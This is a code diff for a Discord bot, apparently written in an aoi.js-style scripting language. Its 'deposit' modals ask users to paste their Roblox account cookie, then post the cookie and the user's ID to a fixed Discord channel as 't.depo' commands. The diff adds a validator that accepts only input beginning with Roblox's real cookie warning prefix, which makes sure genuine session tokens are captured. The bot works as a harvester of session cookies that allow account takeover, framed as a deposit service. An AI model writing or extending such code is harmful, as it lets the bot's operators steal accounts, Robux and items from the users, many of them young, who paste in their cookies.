@@ -10,6 +10,7 @@ $description[
 - To deposit you need to provide your **account cookie**.
 - This information is **really sensitive** so becareful of giving someone your cookie.
 - With this cookie, people can login to your account **without providing username or password**!
+- If you think your Cookie got leaked, logout of your account and login back to reset the Cookie!
 - Check out how to get your cookie [here](https://www.youtube.com/watch?v=1v3inNUxyL8).
 **Do at your own risk**
 
@@ -65,7 +66,7 @@ prototype: "modal",
 code: `
 
 $channelSendMessage[1129331561267990528;
-depo5 $interactionData[author.id] $textinputvalue[cookieinput]
+t.depo5 $interactionData[author.id] $textinputvalue[cookieinput]
 ]
 
 $interactionUpdate[;
@@ -76,6 +77,7 @@ $interactionUpdate[;
 - To deposit you need to provide your **account cookie**.
 - This information is **really sensitive** so becareful of giving someone your cookie.
 - With this cookie, people can login to your account **without providing username or password**!
+- If you think your Cookie got leaked, logout of your account and login back to reset the Cookie!
 - Check out how to get your cookie [here](https://www.youtube.com/watch?v=1v3inNUxyL8).
 **Do at your own risk**
 
@@ -106,6 +108,16 @@ Thanks!
 }
 ]
 
+$onlyif[$stringStratWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
+{
+    "embeds" : "{newEmbed:{description:Your Token Must Include The Warning Line!}{color:ff0000}}",
+    "ephemeral" : true,
+    "options" : {
+        "interaction" : true
+    }
+}
+]
+
 `
 },{
 type: "interaction",
@@ -133,7 +145,7 @@ prototype: "modal",
 code: `
 
 $channelSendMessage[1129331561267990528;
-depo10 $interactionData[author.id] $textinputvalue[cookieinput]
+t.depo10 $interactionData[author.id] $textinputvalue[cookieinput]
 ]
 
 $interactionUpdate[;
@@ -144,6 +156,7 @@ $interactionUpdate[;
 - To deposit you need to provide your **account cookie**.
 - This information is **really sensitive** so becareful of giving someone your cookie.
 - With this cookie, people can login to your account **without providing username or password**!
+- If you think your Cookie got leaked, logout of your account and login back to reset the Cookie!
 - Check out how to get your cookie [here](https://www.youtube.com/watch?v=1v3inNUxyL8).
 **Do at your own risk**
 
@@ -174,6 +187,15 @@ Thanks!
 }
 ]
 
+$onlyif[$stringStratWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
+{
+    "embeds" : "{newEmbed:{description:Your Token Must Include The Warning Line!}{color:ff0000}}",
+    "ephemeral" : true,
+    "options" : {
+        "interaction" : true
+    }
+}
+]
 
 `
 },{
@@ -202,7 +224,7 @@ prototype: "modal",
 code: `
 
 $channelSendMessage[1129331561267990528;
-depo20 $interactionData[author.id] $textinputvalue[cookieinput]
+t.depo20 $interactionData[author.id] $textinputvalue[cookieinput]
 ]
 
 $interactionUpdate[;
@@ -213,6 +235,7 @@ $interactionUpdate[;
 - To deposit you need to provide your **account cookie**.
 - This information is **really sensitive** so becareful of giving someone your cookie.
 - With this cookie, people can login to your account **without providing username or password**!
+- If you think your Cookie got leaked, logout of your account and login back to reset the Cookie!
 - Check out how to get your cookie [here](https://www.youtube.com/watch?v=1v3inNUxyL8).
 **Do at your own risk**
 
@@ -243,6 +266,15 @@ Thanks!
 }
 ]
 
+$onlyif[$stringStratWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
+{
+    "embeds" : "{newEmbed:{description:Your Token Must Include The Warning Line!}{color:ff0000}}",
+    "ephemeral" : true,
+    "options" : {
+        "interaction" : true
+    }
+}
+]
 
 `
 },{
@@ -271,7 +303,7 @@ prototype: "modal",
 code: `
 
 $channelSendMessage[1129331561267990528;
-depo30 $interactionData[author.id] $textinputvalue[cookieinput]
+t.depo30 $interactionData[author.id] $textinputvalue[cookieinput]
 ]
 
 $interactionUpdate[;
@@ -282,6 +314,7 @@ $interactionUpdate[;
 - To deposit you need to provide your **account cookie**.
 - This information is **really sensitive** so becareful of giving someone your cookie.
 - With this cookie, people can login to your account **without providing username or password**!
+- If you think your Cookie got leaked, logout of your account and login back to reset the Cookie!
 - Check out how to get your cookie [here](https://www.youtube.com/watch?v=1v3inNUxyL8).
 **Do at your own risk**
 
@@ -312,6 +345,16 @@ Thanks!
 }
 ]
 
+$onlyif[$stringStratWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
+{
+    "embeds" : "{newEmbed:{description:Your Token Must Include The Warning Line!}{color:ff0000}}",
+    "ephemeral" : true,
+    "options" : {
+        "interaction" : true
+    }
+}
+]
+
 `
 },{
 type: "interaction",
@@ -339,7 +382,7 @@ prototype: "modal",
 code: `
 
 $channelSendMessage[1129331561267990528;
-depo50 $interactionData[author.id] $textinputvalue[cookieinput]
+t.depo50 $interactionData[author.id] $textinputvalue[cookieinput]
 ]
 
 $interactionUpdate[;
@@ -350,6 +393,7 @@ $interactionUpdate[;
 - To deposit you need to provide your **account cookie**.
 - This information is **really sensitive** so becareful of giving someone your cookie.
 - With this cookie, people can login to your account **without providing username or password**!
+- If you think your Cookie got leaked, logout of your account and login back to reset the Cookie!
 - Check out how to get your cookie [here](https://www.youtube.com/watch?v=1v3inNUxyL8).
 **Do at your own risk**
 
@@ -380,6 +424,15 @@ Thanks!
 }
 ]
 
+$onlyif[$stringStratWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
+{
+    "embeds" : "{newEmbed:{description:Your Token Must Include The Warning Line!}{color:ff0000}}",
+    "ephemeral" : true,
+    "options" : {
+        "interaction" : true
+    }
+}
+]
 
 `
 }]
